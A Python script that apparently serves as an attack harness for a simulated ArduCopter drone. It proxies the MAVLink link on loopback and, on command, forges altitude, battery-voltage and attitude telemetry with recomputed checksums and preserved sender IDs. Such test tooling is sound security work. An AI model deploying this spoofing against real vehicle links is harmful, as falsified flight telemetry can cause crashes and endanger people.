"""Telemetry-manipulation attacker on the flight-controller link (a compromised serial / companion link).

  bridge --(5806)--> inject_proxy --(5762)--> ArduCopter SITL SERIAL1

Forwards both directions unchanged until a control line arrives on 127.0.0.1:5807, then rewrites vehicle telemetry in the
FC -> bridge direction (CRC re-computed, original sysid/compid/seq kept):
  alt_bias <metres>   add to GLOBAL_POSITION_INT.alt / relative_alt
  batt_jump <volts>   add to SYS_STATUS.voltage_battery
  freeze              repeat the last ATTITUDE frame forever
  off                 stop rewriting
Counts what it rewrote and writes it to $INJ_OUT every second. Loopback only.
"""

import json
import os
import selectors
import socket
import time

os.environ["MAVLINK20"] = "1"
from pymavlink.dialects.v20 import common as mav2

OUT = os.environ.get("INJ_OUT", "C:/afsitl/inject_out.json")
rd = mav2.MAVLink(None)
rd.robust_parsing = True
enc = mav2.MAVLink(None)
enc.robust_parsing = True
mode = {"kind": "off", "val": 0.0}
stats = {"rewritten": 0, "forwarded_frames": 0, "mode": "off"}
frozen = {"att": None}


def rewrite(msg, raw):
    k = mode["kind"]
    t = msg.get_type()
    if k == "alt_bias" and t == "GLOBAL_POSITION_INT":
        msg.alt += int(mode["val"] * 1000)
        msg.relative_alt += int(mode["val"] * 1000)
    elif k == "batt_jump" and t == "SYS_STATUS":
        msg.voltage_battery = max(0, min(65535, msg.voltage_battery + int(mode["val"] * 1000)))
    elif k == "freeze" and t == "ATTITUDE":
        if frozen["att"] is None:
            frozen["att"] = (
                msg.roll,
                msg.pitch,
                msg.yaw,
                msg.rollspeed,
                msg.pitchspeed,
                msg.yawspeed,
            )
        msg.roll, msg.pitch, msg.yaw, msg.rollspeed, msg.pitchspeed, msg.yawspeed = frozen["att"]
    else:
        return raw
    enc.srcSystem, enc.srcComponent, enc.seq = (
        msg.get_srcSystem(),
        msg.get_srcComponent(),
        msg.get_seq(),
    )
    stats["rewritten"] += 1
    return msg.pack(enc)


sel = selectors.DefaultSelector()


def listen(port, tag):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", port))
    s.listen(4)
    s.setblocking(False)
    sel.register(s, selectors.EVENT_READ, (tag, None))


listen(5806, "bridge_in")
listen(5807, "ctl")
fc = socket.create_connection(("127.0.0.1", 5762))
fc.setblocking(False)
sel.register(fc, selectors.EVENT_READ, ("fc", None))
bridge = None
last = 0.0
while True:
    for key, _ in sel.select(timeout=0.5):
        tag = key.data[0]
        sock = key.fileobj
        if tag == "bridge_in":
            bridge, _a = sock.accept()
            bridge.setblocking(False)
            sel.register(bridge, selectors.EVENT_READ, ("bridge", None))
        elif tag == "ctl":
            c, _a = sock.accept()
            c.settimeout(1)
            try:
                parts = c.recv(200).decode().split()
                mode["kind"] = parts[0]
                mode["val"] = float(parts[1]) if len(parts) > 1 else 0.0
                stats["mode"] = mode["kind"]
                frozen["att"] = None
                c.sendall(b"ok\n")
            except Exception:
                pass
            c.close()
        elif tag == "fc":
            try:
                data = sock.recv(65536)
            except OSError:
                data = b""
            if not data:
                raise SystemExit("fc closed")
            if bridge is None:
                continue
            out = b""
            if mode["kind"] == "off":
                out = data
                stats["forwarded_frames"] += data.count(b"\xfd")
            else:
                msgs = rd.parse_buffer(data) or []
                for m in msgs:
                    if m.get_type() == "BAD_DATA":
                        continue
                    out += bytes(rewrite(m, m.get_msgbuf()))
                    stats["forwarded_frames"] += 1
            try:
                bridge.sendall(out)
            except OSError:
                pass
        elif tag == "bridge":
            try:
                data = sock.recv(65536)
            except OSError:
                data = b""
            if not data:
                sel.unregister(sock)
                sock.close()
                bridge = None
                continue
            try:
                fc.sendall(data)
            except OSError:
                pass
    if time.time() - last > 1:
        last = time.time()
        open(OUT, "w").write(json.dumps(stats))
